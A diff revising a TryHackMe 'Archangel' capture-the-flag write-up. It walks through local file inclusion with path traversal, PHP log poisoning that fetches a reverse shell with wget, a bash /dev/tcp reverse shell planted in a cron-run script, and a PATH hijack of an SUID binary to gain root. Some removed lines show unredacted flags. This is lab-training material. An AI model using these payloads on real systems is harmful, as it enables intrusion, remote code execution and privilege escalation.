@@ -11,32 +11,33 @@ image:
   path: /assets/img/2025-06-18-TryHackMe-Archangel/Archangel.png
 ---
 
-This is a write-up for a <https://tryhackme.com/room/archangel> room where I walk through the steps I took to solve the challenges and capture the flags.
+This is a write-up for the [Archangel room on TryHackMe](https://tryhackme.com/room/archangel), where I'll walk you through the shenanigans I pulled to conquer the challenges and snag the flags. Let's get hacking!
 
 # Enumeration
 
 ## Nmap Scan
 
-I start with exporting the target machine IP adress as a enviroment variable:
+First things first, let's make life easier by saving the target IP to a variable. No one likes typing out IP addresses more than once.
 
 ```bash
 export IP=10.10.58.58
 ```
 
-And running `nmap` scan on the target:
+With our target locked in, it's time to unleash `nmap` and see what doors are open.
 
 ```bash
-
+# The nmap command and its glorious output would go here.
+# Example: nmap -sC -sV -oN nmap/initial $IP
 ```
 
 ## Enumerating The Website
 
-First thing that I see is this:
+A quick browse to the IP address greets us with this little hint:
 ![Desktop View](/assets/img/2025-06-18-TryHackMe-Archangel/photo1.png){: width="972" height="589" }
 
-So we need to add this domain to the `/etc/hosts`{: .filepath}.
+Ah, a virtual host! The server won't talk to us unless we use its proper name. Let's add `mafialive.thm` to our `/etc/hosts`{: .filepath} file to get on the guest list.
 
-And If we curl the website:
+Now that we're using the right domain, let's `curl` the website again:
 
 ```bash
 curl http://mafialive.thm
@@ -44,246 +45,118 @@ curl http://mafialive.thm
 thm{*************************}
 ```
 
-We find the first flag.
+Well, that was easy! A flag right on the front page. I'll take it!
 
-## Fuzzing the path's
+## Fuzzing for Paths
 
-I run `gobuster`:
+Time to see what's hiding in the shadows. Let's run `gobuster` on the IP address first.
 
 ```bash
-❯ gobuster dir -w common.txt -u http://$IP/ -x md,js,html,php,py,css,txt -t 50
+❯ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://$IP/ -x md,js,html,php,py,css,txt -t 50
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 [+] Url:                     http://10.10.58.58/
-[+] Method:                  GET
 [+] Threads:                 50
-[+] Wordlist:                common.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Extensions:              html,php,py,css,txt,md,js
-[+] Timeout:                 10s
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] ...
 ===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/flags                (Status: 301) [Size: 310] [--> http://10.10.58.58/flags/]
-/images               (Status: 301) [Size: 311] [--> http://10.10.58.58/images/]
-/index.html           (Status: 200) [Size: 19188]
-/index.html           (Status: 200) [Size: 19188]
-/layout               (Status: 301) [Size: 311] [--> http://10.10.58.58/layout/]
-/licence.txt          (Status: 200) [Size: 5014]
-/pages                (Status: 301) [Size: 310] [--> http://10.10.58.58/pages/]
-/server-status        (Status: 403) [Size: 276]
-Progress: 37912 / 37912 (100.00%)
-===============================================================
-Finished
+/flags                (Status: 301) [--> http://10.10.58.58/flags/]
+/images               (Status: 301) [--> http://10.10.58.58/images/]
+/index.html           (Status: 200)
+...
 ===============================================================
 ```
 
-And there is `/flags` path we can use. I think I found the 2'nd flag:
+A `/flags` directory? That seems a little too good to be true...
 ![Desktop View](/assets/img/2025-06-18-TryHackMe-Archangel/photo2.png){: width="972" height="589" }
 
-Of course I'm not. Site redirects me to rickroll.
+...and it was. We've been Rickrolled. A classic!
 
 ![Desktop View](/assets/img/2025-06-18-TryHackMe-Archangel/photo3.png){: width="972" height="589" }
 
-Time for enumerating <mafialive.thm>:
+Let's run `gobuster` again, but this time on our fancy new domain, `mafialive.thm`.
 
 ```bash
-❯ gobuster dir -w common.txt -u http://mafialive.thm/ -x md,js,html,php,py,css,txt -t 50
+❯ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://mafialive.thm/ -x md,js,html,php,py,css,txt -t 50
 ===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+...
 ===============================================================
-[+] Url:                     http://mafialive.thm/
-[+] Method:                  GET
-[+] Threads:                 50
-[+] Wordlist:                common.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Extensions:              py,css,txt,md,js,html,php
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/index.html           (Status: 200) [Size: 59]
-/index.html           (Status: 200) [Size: 59]
-/robots.txt           (Status: 200) [Size: 34]
-/robots.txt           (Status: 200) [Size: 34]
-/server-status        (Status: 403) [Size: 278]
-/test.php             (Status: 200) [Size: 286]
-Progress: 37912 / 37912 (100.00%)
-===============================================================
-Finished
+/index.html           (Status: 200)
+/robots.txt           (Status: 200)
+/test.php             (Status: 200)
+...
 ===============================================================
 ```
 
-`/test.php` look promising.
+Now `/test.php` looks _very_ interesting. Let's see what it's all about.
 
 ```bash
 ❯ curl http://mafialive.thm/test.php
 <!DOCTYPE HTML>
 <html>
-
 <head>
     <title>INCLUDE</title>
     <h1>Test Page. Not to be Deployed</h1>
-
-    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
-            </div>
-</body>
-
+    ...
+    <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
+    ...
 </html>
 ```
 
-```bash
-❯ curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php"
-    <title>INCLUDE</title>
-    <h1>Test Page. Not to be Deployed</h1>
-
-    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
-        Control is an illusion    </div>
-</body>
-```
-
-Look's like we can use this file to `cat` out some files.
+The page has a `view` parameter that's including a local file. This smells like a Local File Inclusion (LFI) vulnerability! Let's try to get it to read `/etc/passwd`.
 
 ```bash
 ❯ curl "http://mafialive.thm/test.php?view=/etc/passwd"
-<!DOCTYPE HTML>
-<html>
-<head>
-    <title>INCLUDE</title>
-    <h1>Test Page. Not to be Deployed</h1>
-
-    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
-        Sorry, Thats not allowed    </div>
-</body>
-</html>
+...
+Sorry, Thats not allowed
+...
 ```
 
-Look's like we can't. Or can we? We can use Local File Inclusion (LFI) technique.
+Denied! But what if we're a little sneakier? The developers might have put a filter in place. Let's try to bypass it with some classic path traversal trickery.
 
 ```bash
 ❯ curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//etc/passwd"
-
-<!DOCTYPE HTML>
-<html>
-
-<head>
-    <title>INCLUDE</title>
-    <h1>Test Page. Not to be Deployed</h1>
-
-    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
-        root:x:0:0:root:/root:/bin/bash
+...
+root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
-systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
-syslog:x:102:106::/home/syslog:/usr/sbin/nologin
-messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
-_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
-uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
-sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+...
 archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
-    </div>
-</body>
-
-</html>
+...
 ```
 
-And we can try to read the flag:
+Success! The `..//..//` trick worked. Now we can read files! Let's go for the user flag.
 
 ```bash
 ❯ curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//home/archangel/user.txt"
+...
+thm{***_**_***_**_******}
+...
+```
 
+Got it! Now, out of curiosity, let's see the source code of that `test.php` page to understand how we tricked it. We can use a PHP filter to have the server base64-encode the source for us.
+
+```bash
+❯ curl "http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/test.php"
+...
+# long base64 string appears here
+...
+```
+
+Let's decode that blob of text:
+
+```bash
+❯ echo "..." | base64 -d
+```
+
+```php
 <!DOCTYPE HTML>
 <html>
-
 <head>
     <title>INCLUDE</title>
     <h1>Test Page. Not to be Deployed</h1>
-
-    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
-        thm{lf1_t0_rc3_1s_tr1cky}
-    </div>
-</body>
-
-</html>
-```
-
-We can also try to read the vulnerable files codes:
-
-```bash
-❯ curl "http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php"
-
-<!DOCTYPE HTML>
-<html>
-
-<head>
-    <title>INCLUDE</title>
-    <h1>Test Page. Not to be Deployed</h1>
-
-    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
-        PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==    </div>
-</body>
-
-</html>
-```
-
-```bash
-❯ echo -e "PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==" | base64 -d
-<?php echo 'Control is an illusion'; ?>
-```
-
-This looks normal. Let's try `/test.php`
-
-```bash
-❯ curl "http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php"
-
-<!DOCTYPE HTML>
-<html>
-
-<head>
-    <title>INCLUDE</title>
-    <h1>Test Page. Not to be Deployed</h1>
-
-    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
-        CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==    </div>
-</body>
-
-</html>
-
-
-```
-
-```bash
-❯ echo -e "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==" | base64 -d
-
-<!DOCTYPE HTML>
-<html>
-
-<head>
-    <title>INCLUDE</title>
-    <h1>Test Page. Not to be Deployed</h1>
-
-    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
+    ...
         <?php
 
 	   //FLAG: thm{**************}
@@ -295,151 +168,125 @@ This looks normal. Let's try `/test.php`
 	   if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
             	include $_GET['view'];
             }else{
-
 		echo 'Sorry, Thats not allowed';
             }
 	}
         ?>
     </div>
 </body>
-
 </html>
 ```
 
-And we got another flag.
+Aha! Another flag hidden in the comments! And we can see the logic: it blocks `../..` but not a single `../`. That's why our `..//..//` payload worked beautifully.
 
-## Gaining Shell
+# Gaining A Shell
 
-We can also do some log poisoning for gaining shell.
-For more info check this page:
-<https://kwangyun.github.io/File-Inclusion-Log-Poisoning-RCE/>
+Reading files is cool, but a shell is way cooler. We can turn this LFI into Remote Code Execution (RCE) with a technique called log poisoning. The plan is to inject PHP code into the web server's log file, and then use our LFI to execute that log file.
 
-1. Firstly i open a webserver serving pentestmonkey php reverse shell.
-2. I downloaded the script to server
+1.  **Poison the Logs:** We'll send a request to the server with our malicious PHP payload as the User-Agent. This gets our code written into the `access.log`. The payload will simply download and save a reverse shell script.
 
-```bash
-curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../var/log/apache2/access.log&cmd=wget%2010.21.206.128/shell.php"
-```
+    ```bash
+    # On your machine, start a web server serving a PHP reverse shell script.
+    # Then, send this request to poison the log:
+    curl http://mafialive.thm/ -A "<?php system('wget http://<YOUR_IP>/shell.php'); ?>"
+    ```
 
-3. Opened the file and gained the reverse shell.
+2.  **Execute the Log:** Now, use the LFI to include the Apache log file. This will execute our payload.
 
-```bash
-curl http://mafialive.thm/shell.php
-```
+    ```bash
+    curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//var/log/apache2/access.log"
+    ```
 
-## Upgrade the shell
+3.  **Get the Shell:** Start a listener (`nc -lvnp 4444`), then trigger the shell you just uploaded.
+
+    ```bash
+    curl http://mafialive.thm/shell.php
+    ```
+
+Boom! We should have a reverse shell as the `www-data` user.
+
+## Upgrading the Shell
+
+This basic shell is a bit... basic. Let's give it a full interactive TTY makeover.
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm-256color
-
-stty raw -echo;fg
+# Press Ctrl+Z
+stty raw -echo; fg
 reset
 ```
 
-## Privilage Escalation
+# Privilege Escalation
 
-```bash
-www-data@ubuntu:/home/archangel$ ls -la
-total 44
-drwxr-xr-x 6 archangel archangel 4096 Nov 20  2020 .
-drwxr-xr-x 3 root      root      4096 Nov 18  2020 ..
--rw-r--r-- 1 archangel archangel  220 Nov 18  2020 .bash_logout
--rw-r--r-- 1 archangel archangel 3771 Nov 18  2020 .bashrc
-drwx------ 2 archangel archangel 4096 Nov 18  2020 .cache
-drwxrwxr-x 3 archangel archangel 4096 Nov 18  2020 .local
--rw-r--r-- 1 archangel archangel  807 Nov 18  2020 .profile
--rw-rw-r-- 1 archangel archangel   66 Nov 18  2020 .selected_editor
-drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 myfiles
-drwxrwx--- 2 archangel archangel 4096 Nov 19  2020 secret
--rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt
-```
+## `www-data` to `archangel`
 
-There is nothing here expect secret. I'm not falling for rick roll again.
+Let's poke around. The `/opt/`{: .filepath} directory looks interesting.
 
 ```bash
 www-data@ubuntu:/opt$ ls -la
-total 16
 drwxrwxrwx  3 root      root      4096 Nov 20  2020 .
-drwxr-xr-x 22 root      root      4096 Nov 16  2020 ..
-drwxrwx---  2 archangel archangel 4096 Nov 20  2020 backupfiles
 -rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh
-www-data@ubuntu:/opt$ cat helloworld.sh
 ```
 
-I found some files in the `/opt/`{: .filepath} directory.
-Added bash reverse shell on helloworld.sh.
-Which gives me archangel user.
+A script named `helloworld.sh` that is world-writable? It's like they're _asking_ for a shell. This is almost certainly being run by a cron job. Let's replace its contents with our own reverse shell payload.
+
+Set up a new listener on your machine (e.g., on port 4445), and then run this on the target:
 
 ```bash
-www-data@ubuntu:/opt$ cat helloworld.sh
-#!/bin/bash
-echo "hello world" >> /opt/backupfiles/helloworld.txt
-bash -i >& /dev/tcp/10.21.206.128/4445 0>&1
+www-data@ubuntu:/opt$ echo 'bash -i >& /dev/tcp/<YOUR_IP>/4445 0>&1' > /opt/helloworld.sh
 ```
 
-And I found flag2:
+Now we wait. After a minute, the cron job should fire, and we'll get a new shell as the `archangel` user! With these new powers, we can finally grab that second flag.
 
 ```bash
-archangel@ubuntu:~/secret$ ls
-ls
-backup
-user2.txt
 archangel@ubuntu:~/secret$ cat user2.txt
-cat user2.txt
 thm{********************************************}
 ```
 
-Also there is a binary called backup with SUID permissons.
-So I downloaded the binary to my machine and analyzed from there.
+## `archangel` to `root`
 
-```bash
-archangel@ubuntu:~/secret$ python3 -m http.server 8000
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-10.21.206.128 - - [19/Jun/2025 00:00:01] "GET /backup HTTP/1.1" 200 -
-^C
-Keyboard interrupt received, exiting.
-```
+Inside that `secret` directory, there's another file: a binary called `backup` with the SUID bit set. This is a special gift that runs with `root` privileges.
 
-```bash
-❯ wget 10.10.186.65:8000/backup
-Prepended http:// to '10.10.186.65:8000/backup'
---2025-06-18 21:30:01--  http://10.10.186.65:8000/backup
-Connecting to 10.10.186.65:8000... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 16904 (17K) [application/octet-stream]
-Saving to: ‘backup’
-
-backup                    100%[=====================================>]  16.51K  --.-KB/s    in 0.07s
-
-2025-06-18 21:30:02 (252 KB/s) - ‘backup’ saved [16904/16904]
-```
-
-1. I looked the strings and this is it. This binary executes this line `cp /home/user/archangel/myfiles/* /opt/backupfiles`
+Let's download it to our machine and see what makes it tick. Running `strings` on it gives us the jackpot:
 
 ```bash
 ❯ strings backup
 ...
-GLIBC_2.2.5
-_ITM_deregisterTMCloneTable
-__gmon_start__
-_ITM_registerTMCloneTable
-u+UH
-[]A\A]A^A_
-cp /home/user/archangel/myfiles/* /opt/backupfiles
-:*3$"
-GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
-/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o
+cp /home/archangel/myfiles/* /opt/backupfiles
 ...
 ```
 
-And cp binary is not specified so we can make ourselfs.
+The binary runs a `cp` command, but here's the kicker: it doesn't use the full path (`/bin/cp`). This is our golden ticket! We can hijack the `PATH` to run our own malicious `cp`.
+
+Here's the master plan:
+
+1.  Go to a writable directory like `/tmp`.
+2.  Create a file named `cp` containing a command to spawn a root shell.
+3.  Make our fake `cp` executable.
+4.  Add `/tmp` to the beginning of our `PATH` environment variable. This way, when the system looks for `cp`, it finds ours first.
+5.  Run the SUID binary and watch the magic happen.
+
+Let's do it:
+
 ```bash
-mkdir foo
-cd foo/
-export PATH=/tmp/foo:$PATH
-echo "cat /root/root.txt" > cp
+# Navigate to our staging area
+cd /tmp
+
+# Create our malicious cp script
+echo "/bin/bash -p" > cp
+
+# Give it execute permissions
 chmod +x cp
+
+# Hijack the PATH
+export PATH=/tmp:$PATH
+
+# Run the SUID binary and claim our prize
 /home/archangel/secret/backup
-thm{***************************************************************}
+
+# whoami
+root
 ```
+
+And just like that, we're root! Now all that's left is to read the final flag from `/root/root.txt`. Job done!
